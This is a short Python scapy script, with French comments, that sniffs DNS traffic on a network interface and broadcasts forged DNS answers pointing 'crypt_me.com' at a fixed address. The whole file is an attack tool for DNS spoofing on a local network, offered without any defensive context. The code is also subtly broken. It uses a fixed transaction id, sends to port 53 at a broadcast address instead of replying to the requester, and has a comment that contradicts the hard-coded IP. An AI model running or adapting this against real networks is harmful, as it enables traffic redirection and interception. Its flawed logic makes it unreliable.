from scapy.all import *

def dns_spoof(pkt):
    try:
        # Vérifier la présence de la couche Ethernet
        if Ether in pkt:
            print("DNS Request detected. Sending broadcast response.")

            # Construire une réponse DNS avec une adresse IP différente à chaque fois
            spoofed_ip = "192.168.1.255"
            dns_response = Ether(src=get_if_hwaddr(interface), dst="ff:ff:ff:ff:ff:ff") / IP(dst="255.255.255.255") / UDP(dport=53) / DNS(
                id=1,
                qr=1,
                aa=1,
                qdcount=1,
                ancount=1,
                qd=DNSQR(qname="crypt_me.com"),
                an=DNSRR(rrname="crypt_me.com", rdata=spoofed_ip),
            )

            sendp(dns_response, iface=interface, verbose=False)
            print(f"DNS Response sent with spoofed IP: {spoofed_ip}")
    except Exception as e:
        print(f"Error processing packet: {e}")

# Configurer l'interface à écouter
interface = "eno1"

# Lancer l'écoute en mode promiscuous pour capturer tous les paquets
sniff(iface=interface, prn=dns_spoof, store=0, filter="udp and port 53")
